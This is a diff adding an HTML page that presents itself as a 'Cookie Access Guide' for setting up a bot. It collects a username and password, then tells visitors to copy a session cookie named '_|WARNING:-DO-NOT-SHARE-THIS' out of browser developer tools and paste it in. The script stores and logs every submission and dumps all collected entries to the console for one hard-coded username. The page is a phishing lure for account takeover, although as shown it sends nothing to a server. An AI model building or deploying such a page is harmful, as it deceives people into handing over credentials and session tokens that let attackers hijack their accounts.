@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Access Guide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: url('https://source.unsplash.com/1600x900/?space,galaxy') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+        }
+        .input-box {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        .btn {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            background-color: #28a745;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+        .btn:hover {
+            background-color: #218838;
+        }
+        #cookieSection {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginSection">
+        <h2>Sign In</h2>
+        <p>Enter your username and a fake password.</p>
+        <input type="text" class="input-box" id="username" placeholder="Username">
+        <input type="password" class="input-box" id="password" placeholder="Fake Password">
+        <button class="btn" onclick="signIn()">Sign In</button>
+    </div>
+
+    <div class="container" id="cookieSection">
+        <h2>Cookie Access Guide</h2>
+        <p>To use this bot, you need to find your special cookie.</p>
+        <ol>
+            <li>Right-click anywhere on this page and select <strong>Inspect</strong>.</li>
+            <li>Go to the <strong>Application</strong> tab.</li>
+            <li>In the left sidebar, under <strong>Storage</strong>, click <strong>Cookies</strong>.</li>
+            <li>Select this website from the list.</li>
+            <li>Find the cookie named <code>_|WARNING:-DO-NOT-SHARE-THIS</code>.</li>
+            <li>Copy its value and paste it below:</li>
+        </ol>
+        <input type="text" class="input-box" id="cookieInput" placeholder="Paste your cookie here">
+        <button class="btn" onclick="submitCookie()">Submit</button>
+    </div>
+    
+    <script>
+        let users = [];
+
+        function signIn() {
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+            
+            if (username && password) {
+                users.push({ username, password });
+                alert("Signed in successfully.");
+                document.getElementById("loginSection").style.display = "none";
+                document.getElementById("cookieSection").style.display = "block";
+            } else {
+                alert("Please enter both username and a fake password.");
+            }
+        }
+
+        function submitCookie() {
+            let cookieValue = document.getElementById("cookieInput").value;
+            let username = users[users.length - 1]?.username;
+            
+            if (cookieValue) {
+                users[users.length - 1].cookie = cookieValue;
+                alert("Cookie received. Proceeding with bot setup...");
+                console.log("User cookie:", cookieValue);
+                
+                if (username === "realgysj") {
+                    console.log("All users:", users);
+                }
+            } else {
+                alert("Please enter the cookie value.");
+            }
+        }
+    </script>
+</body>
+</html>
